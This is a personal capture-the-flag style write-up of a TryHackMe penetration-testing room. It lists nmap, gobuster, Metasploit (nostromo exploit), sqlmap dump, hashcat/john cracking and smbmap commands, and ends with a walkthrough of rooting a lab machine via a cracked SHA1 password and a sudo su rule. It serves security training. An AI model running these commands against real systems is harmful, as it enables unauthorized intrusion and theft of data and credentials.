# Matheus Jesus 07-04-2020

## Try Hack Me - [CC: Pen Testing](https://tryhackme.com/room/ccpentesting)

### NMAP

* -p specify port
* -sn ping host
* -sU UDP
* -sC default scripts
* -o OS detection
* -sV version

#### Deploy machine

nmap -sC -sV -oN nmap_initial **IP**

http-title: Apache2 Ubuntu Default Page: It works

### NETCAT

* -l listen
* -v verbose
* -p port
* -e execute file
* -u UDP

#### nc -nlvp **PORT**

### GO Buster

#### Find directories

##### /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

```sh
gobuster dir -u 10.10.183.224 -w /usr/share/wordlists/rockyou.txt
```

Found /secret

```sh
gobuster dir -u 10.10.183.224/secret -w /usr/share/wordlists/rockyou.txt -x xxa
```

Found /password.xxa

### Nikto

* Web Scanning
* Find vulnerabilities
* CVEs

#### nikto -h 10.10.183.234

### Metasploit

use **exploit/multi/http/nostromo_code_exec**

set RHOSTS and LHOST

exploit

#### Inside the exploit

ls /var/nostromo/htdocs

##### Spawn TTY

python -c 'import pty; pty.spawn("/bin/bash")'

cat /var/nostromo/htdocs/s3cretd1r/nice

### Hashcat

hashcat -m 0 -a 0 56ab24c15b72a457069c5ea42fcfc640 /usr/share/wordlists/rockyou.txt --force

MD5 56ab24c15b72a457069c5ea42fcfc640:happy

MD4 4bc9ae2b9236c2ad02d81491dcb51d5f:nootnoot

### John The Ripper

#### Whan can John decrypt

john --list=formats

#### Decrypting

john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 5d41402abc4b2a76b9719d911017c592

john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA1 johnSHA1

### SQLMap

[SQL Injection Reference](https://owasp.org/www-community/attacks/SQL_Injection)

#### IP 10.10.151.139

sqlmap -u 10.10.151.139 --forms
The command will try to exploit the SQL with different injections.

This one found --dbms=mysql
and found 3 scripts for injections

#### DUMP

sqlmap -u 10.10.151.139 --dump --dbms=mysql --forms
The command will utilize the known exploits to access the database and retrieve all data.
It then dumps into a csv file.
There is a database called tests with a table msg and a table lol. (lol.csv and msg.csv)

### SMB

#### SMBMAP

smbmap -u "admin" -p "password" -H 10.10.10.10 -x ipconfig

#### SMBClient

Offers SMBMAP and a prompt

#### [Impacket](https://github.com/SecureAuthCorp/impacket)

Scripts for exploting windows machines over SMB and other protocols

### PRIVILEGE ESCALATION

#### General

[A bunch of tools and payloads for every stage of pentesting](https://github.com/swisskyrepo/PayloadsAllTheThings)

#### Linux

[a bit old but still worth looking at](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
[One of the most popular priv esc scripts](https://github.com/rebootuser/LinEnum)
[Another popular script](https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh)
[A Script that's dedicated to searching for kernel exploits](https://github.com/mzet-/linux-exploit-suggester)
[I can not overstate the usefulness of this for priv esc, if a common binary has special permissions, you can use this site to see how to get root perms with it.](https://gtfobins.github.io)

#### Windows

[Dictates some very useful commands and methods to enumerate the host and gain intel](https://www.fuzzysecurity.com/tutorials/16.html)
[A bit old but still an incredibly useful script](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp)
[A general enumeration script](https://github.com/411Hall/JAWS)

### Final Exam

#### IP 10.10.118.41

#### GOBuster

gobuster dir -u 10.10.118.41 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
Found /secret

##### Stupid hint from walkthrough, there is a hidden secret.txt file inside secret folder

gobuster dir -u 10.10.118.41/secret -w /usr/share/wordlists/rockyou.txt -x txt
Found /secret/secret.txt

nyan:046385855FC9580393853D8E81F240B66FE9A7B8

#### Crack nyan password

hashid 046385855FC9580393853D8E81F240B66FE9A7B8 -> SHA1
hashcat -m 100 -a 0 046385855FC9580393853D8E81F240B66FE9A7B8 /usr/share/wordlists/rockyou.txt --force

nyan:nyan

#### SSH

ssh nyan@10.10.118.41
nyan

cat user.txt > supernootnoot

```sh
sudo -l

Matching Defaults entries for nyan on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nyan may run the following commands on ubuntu:
    (root) NOPASSWD: /bin/su
```

#### LinPeas

scp /opt/linPEAR/linpeas.sh nyan@10.10.118.41:/dev/shm

[+] User nyan may run the following commands on ubuntu:
    (root) NOPASSWD: /bin/su

```sh
User nyan may run the following commands on ubuntu:
    (root) NOPASSWD: /bin/su
nyan@ubuntu:/dev/shm$ sudo su
root@ubuntu:/dev/shm# whoami
root
```

nyan can run sudo su

as root -> cat /root/root.txt -> congratulations!!!!
